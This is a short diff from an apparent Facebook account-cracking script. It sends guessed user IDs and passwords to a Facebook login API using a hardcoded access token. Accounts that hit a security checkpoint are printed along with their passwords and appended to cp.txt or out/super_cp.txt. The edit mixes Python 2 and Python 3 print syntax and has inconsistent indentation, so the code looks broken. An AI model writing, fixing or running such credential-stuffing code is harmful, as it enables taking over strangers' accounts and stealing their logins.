@@ -298,11 +298,13 @@ def b_menu_select():
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		    d=json.loads(q)
 		    if 'www.facebook.com' in d['error_msg']:
-		        print("\x1b[1;92m[RAKA-CP] "+uid+" | "+pass1)
-		        cp=open("cp.txt","a")
-		        cp.write(uid+" | "+pass1+"\n")
-		        cp.close()
-		        cps.append(uid)
+		        print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
+			print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
+			print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
+			print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass1 + '\n'
+			cek = open("out/super_cp.txt", "a")
+			cek.write("ID:" +user+ " Pw:" +pass1+"\n")
+			cek.close()
 		    else:
 		    	if "access_token" in d:
 			    print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
